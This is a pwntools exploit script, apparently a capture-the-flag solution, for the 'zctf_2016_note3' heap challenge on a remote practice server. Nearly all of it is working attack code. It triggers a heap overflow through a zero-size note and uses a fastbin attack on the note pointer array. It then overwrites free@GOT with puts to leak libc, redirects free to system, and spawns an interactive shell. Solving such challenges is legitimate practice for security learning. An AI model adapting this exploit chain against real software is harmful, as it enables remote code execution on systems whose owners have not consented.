#!/usr/bin/env python
# coding=utf-8
from pwn import *
context.arch = 'amd64'


local = 0
if local == 1:
    r=process('./zctf_2016_note3')
    gdb.attach(r,"b * 0x400A1B")
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    r = remote('node4.buuoj.cn',25643)
    libc = ELF('libc-2.23-0ubuntu11.so')

elf= ELF('./zctf_2016_note3')

def add(size,content):
    r.recvuntil('option--->>')
    r.sendline('1')
    r.recvuntil('content:')
    r.sendline(str(size))
    r.recvuntil('content:')
    r.sendline(content)

def edit(index,content):
    r.recvuntil('option--->>')
    r.sendline('3')
    r.recvuntil('note:')
    r.sendline(str(index))
    r.recvuntil('content:')
    r.sendline(content)

def dele(index):
    r.recvuntil('option--->>')
    r.sendline('4')
    r.recvuntil('note:')
    r.sendline(str(index))

add(0x68,'aaaaaaaa')
add(0x0,'bbbbbbbb')
add(0x68,'cccccccc')
add(0x68,'/bin/sh')

dele(2)
edit(1,cyclic(0x18)+p64(0x71)+p64(0x6020ad))

add(0x68,'eeeeeeee')
add(0x68,cyclic(11)+p64(elf.got['free'])+p64(elf.got['__libc_start_main']))
edit(0,p32(elf.symbols['puts'])+'\x00\x00')

dele(1)
r.recvuntil('\n')
libc_start_main = u64(r.recv(6)+'\x00\x00')
log.success("libc_start_main:"+hex(libc_start_main))
libc_addr = libc_start_main - libc.symbols['__libc_start_main']
system = libc_addr + libc.symbols['system']

edit(0,p64(system)[:7])

dele(3)


r.interactive()
